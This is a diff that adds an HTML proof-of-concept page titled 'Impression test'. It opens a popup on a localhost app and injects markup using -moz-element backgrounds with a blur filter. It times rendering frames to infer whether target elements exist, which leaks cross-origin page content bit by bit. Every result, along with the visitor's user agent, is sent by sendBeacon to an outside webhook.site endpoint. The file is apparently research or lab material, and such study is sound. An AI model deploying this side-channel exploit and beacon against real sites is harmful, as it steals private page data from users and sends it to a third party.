@@ -1,0 +1,34 @@
+<!doctype html><meta charset="utf-8"><title>Impression test</title>
+<pre id="log"></pre>
+<script>
+const cb="https://webhook.site/2552eebc-b08c-488d-bd60-90fefaa9aa21";
+const out={ua:navigator.userAgent,start:Date.now(),events:[],measurements:[]};
+const send=stage=>{out.stage=stage;navigator.sendBeacon(cb,JSON.stringify(out));document.getElementById("log").textContent=JSON.stringify(out,null,2)};
+onblur=()=>out.events.push(["blur",performance.now()]);
+onfocus=()=>out.events.push(["focus",performance.now()]);
+if(location.hash.includes("run=1"))(async()=>{
+ send("started");
+ try{
+  const w=window.open("http://localhost:3000/","impressionprobe","width=700,height=600");
+  if(!w){out.error="popup blocked";send("failed");return}
+  window.focus();await new Promise(r=>setTimeout(r,600));
+  send("popup_opened");
+  const ids=["missing-marker","preview-title","bit-0-0","missing-marker",
+    "bit-0-1","bit-0-2","bit-0-3","missing-marker"];
+  for(let repeat=0;repeat<2;repeat++)for(const id of ids){
+   const p='<div style="width:600px;height:160px;background:-moz-element(#'+id+');filter:blur(30px)"></div>';
+   const t=performance.now();
+   w.location="http://localhost:3000/?probe="+repeat+"-"+id+"#"+encodeURIComponent(p);
+   window.focus();
+   const frames=[];let prev=t;
+   for(let j=0;j<3;j++){await new Promise(requestAnimationFrame);
+    const now=performance.now();frames.push(Math.round((now-prev)*10)/10);prev=now}
+   out.measurements.push({repeat,id,delta:Math.round(performance.now()-t),frames,
+    visibility:document.visibilityState});
+   if(out.measurements.length%4===0)send("progress");
+  }
+  w.close();
+ }catch(e){out.error=String(e)}
+ send("done");window.__IMPRESSION_DONE__=true;
+})();
+</script>
